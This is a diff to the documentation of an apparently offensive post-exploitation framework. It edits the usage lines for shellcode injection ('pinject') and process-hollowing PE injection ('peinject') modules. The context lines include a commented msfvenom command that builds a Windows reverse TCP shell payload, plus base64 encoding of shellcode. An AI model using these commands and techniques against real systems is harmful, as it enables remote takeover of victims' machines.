@@ -502,8 +502,8 @@ Generate shellcode with proper null byte avoidance and correct format:
 # Then base64 encode it before sending to the module
 base64 -w 0 shellcode.bin
 
-pinject <shellcode> [agent_id=<agent_id>] # METHOD - 1
-run pinject <shellcode> [agent_id=<agent_id>] # METHOD - 2
+pinject <shellcode> # METHOD - 1 (Interactive mode)
+run pinject <shellcode> [agent_id=<agent_id>] # METHOD - 2 (Non-interactive mode)
 ```
 
 #### Notes
@@ -543,8 +543,8 @@ Inject a PE file using Process Hollowing
 ```
 # msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe
 
-peinject <pe_file> [agent_id=<agent_id>] [pe_file=<payload_path>] # METHOD - 1
-run peinject <pe_file> [agent_id=<agent_id>] [pe_file=<payload_path>] # METHOD - 2
+peinject pe_file=<payload_path> # METHOD - 1 (Interactive mode)
+run peinject pe_file=<payload_path> [agent_id=<agent_id>] # METHOD - 2 (Non-interactive mode)
 ```
 
 #### Supported Payloads
